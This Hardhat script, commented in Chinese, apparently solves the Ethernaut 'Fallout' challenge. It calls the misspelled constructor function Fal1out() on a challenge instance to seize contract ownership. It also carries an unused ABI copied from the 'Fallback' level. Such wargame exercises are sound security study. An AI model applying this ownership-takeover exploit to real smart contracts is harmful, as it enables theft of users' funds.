import hre from "hardhat";

// 替換成 Fallout 實例合約地址
const contractAddress = "0x7451Ec6AeFaF19D9766c4d45d66275CD87755297"; 
console.log("目標 Fallout 實例合約地址:", contractAddress);

// 我這個挑戰者的帳戶地址
const myAccount = "0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6"
console.log("我的帳戶地址: ", myAccount);

// 獲取 signer（帳戶）
const [signer] = await hre.ethers.getSigners();
console.log("我的帳戶地址 by hre: ", signer.address);

// 合約 ABI
const contractABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "contribute",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "contributions",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "getContribution",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "withdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// 使用 hardhat ether.js 創建合約實例
// const fallback = new hre.ethers.Contract(contractAddress, contractABI, signer);

const fallout = await hre.ethers.getContractAt("Fallout", contractAddress);

async function main() {  
  // 查詢合約 owner
  const owner = await fallout.owner();
  console.log("Contract owner:", owner);
 
  // 變成合約 owner
  await fallout.Fal1out();
  console.log("Contract owner:", await fallout.owner());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
